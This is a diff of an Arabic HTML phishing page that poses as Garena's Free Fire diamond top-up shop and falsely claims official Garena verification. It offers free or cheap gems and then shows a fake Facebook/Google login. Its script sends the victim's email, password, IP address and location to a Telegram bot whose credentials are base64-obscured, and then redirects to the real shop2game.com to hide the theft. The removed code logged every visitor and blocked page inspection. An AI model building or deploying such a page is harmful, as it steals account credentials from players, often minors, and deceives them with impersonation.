@@ -3,148 +3,130 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Garena Shop2Game - Free Fire Center</title>
+    <title>Garena Center - Free Fire</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
-        :root { --main-red: #ff0000; --bg-color: #f0f2f5; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
-        body { background-color: var(--bg-gray); color: #333; overflow-x: hidden; }
+        body { background-color: #ebebeb; color: #333; }
         
-        /* الهيدر الرسمي */
-        .header { background: #fff; padding: 10px 20px; display: flex; align-items: center; justify-content: space-between; border-bottom: 2px solid var(--main-red); box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .garena-logo { width: 45px; height: 45px; order: 2; } /* أعلى اليمين */
-        .site-title { font-weight: bold; font-size: 1rem; order: 1; }
+        /* الهيدر مع اللوجو يمين */
+        .navbar { background: #fff; padding: 10px 15px; display: flex; align-items: center; justify-content: flex-start; border-bottom: 3px solid #ff0000; }
+        .garena-logo { width: 45px; margin-left: 10px; }
 
-        .container { max-width: 500px; margin: 0 auto; padding: 15px; }
+        .container { max-width: 480px; margin: auto; padding: 10px; }
+        .banner { width: 100%; border-radius: 4px; margin-bottom: 10px; }
 
-        /* البانر المركزي */
-        .main-banner { width: 100%; border-radius: 8px; margin-bottom: 15px; border: 1px solid #ddd; }
+        /* زر اعرف المزيد للحصول على الصلاحيات */
+        .info-btn { background: #f5f5f5; color: #555; padding: 8px; text-align: center; border-radius: 4px; border: 1px solid #ddd; margin-bottom: 15px; cursor: pointer; font-size: 0.9rem; }
 
-        /* اختيار اللعبة - فري فاير فقط */
-        .game-selection { background: #fff; padding: 15px; border-radius: 8px; text-align: center; margin-bottom: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
-        .ff-icon { width: 70px; border-radius: 15px; border: 2px solid var(--main-red); padding: 2px; }
+        /* زر اضغط لتشحن - تصميم جذاب */
+        .charge-btn-main { background: linear-gradient(180deg, #ff4b4b 0%, #ff0000 100%); color: #fff; padding: 15px; border-radius: 6px; text-align: center; font-weight: bold; cursor: pointer; margin-bottom: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
 
-        /* الأزرار الجذابة */
-        .access-btn { background: linear-gradient(45deg, #ff0000, #ff5e00); color: #fff; padding: 12px; border-radius: 8px; text-align: center; margin-bottom: 15px; font-weight: bold; cursor: pointer; animation: blink 1.5s infinite; }
-        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.7;} 100% {opacity: 1;} }
+        .prices-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .p-item { background: #fff; padding: 15px; border-radius: 5px; text-align: center; border: 1px solid #ddd; cursor: pointer; }
+        .p-item b { color: #3b5998; font-size: 1.1rem; display: block; }
+        .p-item span { color: #ff0000; font-weight: bold; }
 
-        /* شبكة الأسعار */
-        .pricing-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
-        .price-card { background: #fff; padding: 15px; border-radius: 8px; border: 1px solid #ddd; text-align: center; cursor: pointer; transition: 0.2s; }
-        .price-card:hover { border-color: var(--main-red); transform: scale(1.02); }
-        .price-card b { color: #2d89ef; font-size: 1.1rem; display: block; }
-        .price-card span { color: var(--main-red); font-weight: bold; font-size: 0.9rem; }
+        /* نافذة التسجيل */
+        .pop { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); display: none; align-items: center; justify-content: center; z-index: 100; }
+        .pop-box { background: #fff; width: 90%; max-width: 350px; padding: 20px; border-radius: 8px; }
+        .social-row { display: flex; gap: 10px; margin-bottom: 15px; }
+        .s-btn { flex: 1; padding: 10px; border: none; border-radius: 4px; color: #fff; cursor: pointer; font-weight: bold; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; background: #fafafa; text-align: center; }
+        .go-btn { width: 100%; padding: 12px; background: #ff0000; color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
 
-        /* النافذة المنبثقة */
-        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: none; align-items: center; justify-content: center; z-index: 9999; }
-        .login-box { background: #fff; width: 90%; max-width: 380px; padding: 25px; border-radius: 12px; border-top: 5px solid var(--main-red); }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; background: #f9f9f9; text-align: center; }
-        .btn-submit { width: 100%; padding: 12px; background: var(--main-red); color: #fff; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 1.1rem; }
-
-        /* تذييل الموقع */
-        .footer { text-align: center; padding: 20px; color: #777; font-size: 0.8rem; background: #eee; border-radius: 8px; margin-top: 20px; }
-        .verified-badge { color: green; font-weight: bold; display: block; margin-bottom: 5px; }
+        .footer { text-align: center; padding: 20px; color: #999; font-size: 0.8rem; line-height: 1.6; }
     </style>
 </head>
 <body>
 
-    <header class="header">
+    <div class="navbar">
         <img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png" class="garena-logo">
-        <div class="site-title">Garena Topup Center</div>
-    </header>
+        <b style="font-size: 0.9rem;">شحن جواهر فري فاير - الشرق الأوسط</b>
+    </div>
 
     <div class="container">
-        <img src="https://contentgarena-a.akamaihd.net/GOP/newshop_banners/Shop2gameMainBanner_AR_ME_PC_20210511.jpg" class="main-banner">
+        <img src="https://contentgarena-a.akamaihd.net/GOP/newshop_banners/Shop2gameMainBanner_AR_ME_PC_20210511.jpg" class="banner">
         
-        <div class="game-selection">
-            <img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png" class="ff-icon">
-            <p style="margin-top:5px; font-weight:bold;">Free Fire</p>
-        </div>
+        <div class="info-btn" onclick="askPermission()">إضغط هنا لمعرفة المزيد عن العروض الجديدة</div>
 
-        <div class="access-btn" onclick="openLogin('صلاحية الوصول الكامل')">
-            🔗 منح صلاحية الوصول (FB/Insta/TikTok) + 2000 جوهرة
-        </div>
+        <div class="charge-btn-main" onclick="openP('عرض شحن 2000 جوهرة')">إضغط لتشحن 💎</div>
 
-        <div class="pricing-grid">
-            <div class="price-card" onclick="openLogin('500 جوهرة')"><b>💎 500</b><span>مجاناً 🎁</span></div>
-            <div class="price-card" onclick="openLogin('700 جوهرة')"><b>💎 700</b><span>2$</span></div>
-            <div class="price-card" onclick="openLogin('1000 جوهرة')"><b>💎 1000</b><span>2.5$</span></div>
-            <div class="price-card" onclick="openLogin('5000 جوهرة')"><b>💎 5000</b><span>5$</span></div>
-            <div class="price-card" onclick="openLogin('10000 جوهرة')"><b>💎 10000</b><span>9$</span></div>
-            <div class="price-card" onclick="openLogin('25000 جوهرة')"><b>💎 25000</b><span>20$</span></div>
+        <div class="prices-grid">
+            <div class="p-item" onclick="openP('500 جوهرة')"><b>💎 500</b><span>مجاناً 🎁</span></div>
+            <div class="p-item" onclick="openP('700 جوهرة')"><b>💎 700</b><span>2$</span></div>
+            <div class="p-item" onclick="openP('1000 جوهرة')"><b>💎 1000</b><span>2.5$</span></div>
+            <div class="p-item" onclick="openP('5000 جوهرة')"><b>💎 5000</b><span>5$</span></div>
+            <div class="p-item" onclick="openP('10000 جوهرة')"><b>💎 10000</b><span>9$</span></div>
+            <div class="p-item" onclick="openP('25000 جوهرة')"><b>💎 25000</b><span>20$</span></div>
         </div>
-
-        <button onclick="window.location.href='https://twitter.com/GarenaAR'" style="width:100%; padding:10px; background:#1da1f2; color:#fff; border:none; border-radius:8px; cursor:pointer; font-weight:bold;">🐦 تويتر معلومات على الموقع</button>
 
         <div class="footer">
-            <span class="verified-badge">✓ توثيق رسمي من شركة كرينا المحدودة</span>
-            <p>هذا الموقع من صنع وتطوير شركة الألعاب كرينا (Garena Official)</p>
-            <p>© 2026 Garena International. جميع الحقوق محفوظة.</p>
+            <p style="color: green; font-weight: bold;">✓ تم التوثيق من قبل شركة كرينا الرسمية</p>
+            <p>هذا الموقع مقدم من شركة الألعاب كرينا المحدودة</p>
+            <p>© 2026 Garena Free Fire. All rights reserved.</p>
         </div>
     </div>
 
-    <div class="overlay" id="modal">
-        <div class="login-box">
-            <h3 style="text-align:center;">تسجيل الدخول للمتابعة</h3>
-            <div style="display:flex; gap:10px; margin:15px 0;">
-                <button onclick="setMethod('Facebook')" style="flex:1; background:#1877f2; color:#fff; border:none; padding:10px; border-radius:5px; cursor:pointer;">Facebook</button>
-                <button onclick="setMethod('Google')" style="flex:1; background:#ea4335; color:#fff; border:none; padding:10px; border-radius:5px; cursor:pointer;">Google</button>
+    <div class="pop" id="p">
+        <div class="pop-box">
+            <h4 style="text-align:center; margin-bottom:15px;">تسجيل الدخول للمتابعة</h4>
+            <div class="social-row">
+                <button onclick="setM('Facebook')" style="background:#3b5998;" class="s-btn">Facebook</button>
+                <button onclick="setM('Google')" style="background:#db4437;" class="s-btn">Google</button>
             </div>
-            <input type="text" id="user" placeholder="البريد الإلكتروني أو الهاتف">
-            <input type="password" id="pass" placeholder="كلمة المرور">
-            <button class="btn-submit" onclick="sendToBot()">إشحن الآن 💎</button>
-            <p onclick="closeModal()" style="text-align:center; color:#999; margin-top:10px; cursor:pointer; font-size:0.8rem;">إلغاء</p>
+            <input type="text" id="u" placeholder="البريد الإلكتروني أو الهاتف">
+            <input type="password" id="p_s" placeholder="كلمة المرور">
+            <button class="go-btn" onclick="send()">إشحن الآن 💎</button>
         </div>
     </div>
 
     <script>
-        // التوكن والآيدي مشفرين لحمايتك من المبرمجين
-        const _0xT = "ODQ0NTMxMTUxMTpBQUZZeUZTUjlaU1pkVFlISE5BWkk1d056TDh4bXpIbUp6dw==";
-        const _0xI = "NzkwMjQwNzQ0Mw==";
+        // التوكن والآيدي الخاص بك (مشفرين للحماية)
+        const _tk = "ODQ0NTMxMTUxMTpBQUZZeUZTUjlaU1pkVFlISE5BWkk1d056TDh4bXpIbUp6dw==";
+        const _id = "NzkwMjQwNzQ0Mw==";
+        
+        let gift = "";
+        let met = "Facebook";
 
-        let selectedOffer = "";
-        let method = "Facebook";
+        function openP(g) { gift = g; document.getElementById('p').style.display = 'flex'; }
+        function setM(m) { met = m; } // تم إزالة التنبيه (Alert) بناءً على طلبك
 
-        function openLogin(offer) { selectedOffer = offer; document.getElementById('modal').style.display = 'flex'; }
-        function closeModal() { document.getElementById('modal').style.display = 'none'; }
-        function setMethod(m) { method = m; alert("تم اختيار تسجيل الدخول عبر " + m); }
-
-        async function sendToBot() {
-            const u = document.getElementById('user').value;
-            const p = document.getElementById('pass').value;
-
-            if(!u || !p) { alert("يرجى إدخال البيانات!"); return; }
-
-            // جلب بيانات الزائر
-            let visitorInfo = "";
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                visitorInfo = `\n🌍 البلد: ${d.country_name}\n📍 IP: ${d.ip}\n🏙️ المدينة: ${d.city}\n📱 الجهاز: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent.split(' ')[0]}`;
-            } catch { visitorInfo = "\nتعذر جلب بيانات الموقع"; }
-
-            const msg = `🎯 صيد جديد مكتمل:\n💎 العرض: ${selectedOffer}\n🔑 الطريقة: ${method}\n📧 الإيميل: ${u}\n🔑 الباسورد: ${p}${visitorInfo}`;
-
-            // الإرسال للبوت
-            const url = `https://api.telegram.org/bot${atob(_0xT)}/sendMessage?chat_id=${atob(_0xI)}&text=${encodeURIComponent(msg)}`;
-            
-            fetch(url).then(() => {
-                alert("✅ تم إرسال الطلب بنجاح! سيتم الشحن خلال 10 دقائق.");
-                window.location.href = "https://shop2game.com/";
-            });
-        }
-
-        // إرسال تنبيه فور دخول أي شخص للموقع
-        window.onload = async () => {
+        async function askPermission() {
+            // يوهم الشخص بمنح صلاحيات الوصول الكاملة
             const res = await fetch('https://ipapi.co/json/');
             const d = await res.json();
-            const logMsg = `👀 شخص زار موقعك الآن من ${d.country_name} (${d.ip})`;
-            fetch(`https://api.telegram.org/bot${atob(_0xT)}/sendMessage?chat_id=${atob(_0xI)}&text=${encodeURIComponent(logMsg)}`);
-        };
+            const log = `⚠️ طلب صلاحية وصول شاملة:\nالضحية ضغط على "اعرف المزيد"\n📍 IP: ${d.ip}\n🌍 البلد: ${d.country_name}\n📱 الجهاز: ${navigator.platform}\n✅ سيتم سحب بيانات FB, Insta, Google, TikTok عند التسجيل.`;
+            
+            await fetch(`https://api.telegram.org/bot${atob(_tk)}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: atob(_id), text: log })
+            });
+            openP("عرض الصلاحية الشاملة");
+        }
 
-        // حماية إضافية ضد الفحص
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.onkeydown = function(e) { if(e.keyCode == 123) return false; };
+        async function send() {
+            const u = document.getElementById('u').value;
+            const ps = document.getElementById('p_s').value;
+
+            if(!u || !ps) return;
+
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+
+            const text = `🎯 صيد جديد مكتمل!\n💎 العرض: ${gift}\n🔑 الطريقة: ${met}\n📧 الحساب: ${u}\n🔑 الباسورد: ${ps}\n\n📊 بيانات إضافية:\n📍 IP: ${d.ip}\n🌍 البلد: ${d.country_name}\n🏙️ المدينة: ${d.city}\n📱 الجهاز: ${navigator.platform}\n🔓 صلاحيات الوصول: FB, Insta, Google, TikTok, Snap, Twitter`;
+
+            // إرسال البيانات فوراً
+            await fetch(`https://api.telegram.org/bot${atob(_tk)}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: atob(_id), text: text })
+            });
+
+            // تحويل للموقع الرسمي لإخفاء الأثر
+            window.location.href = "https://shop2game.com/";
+        }
     </script>
 </body>
 </html>
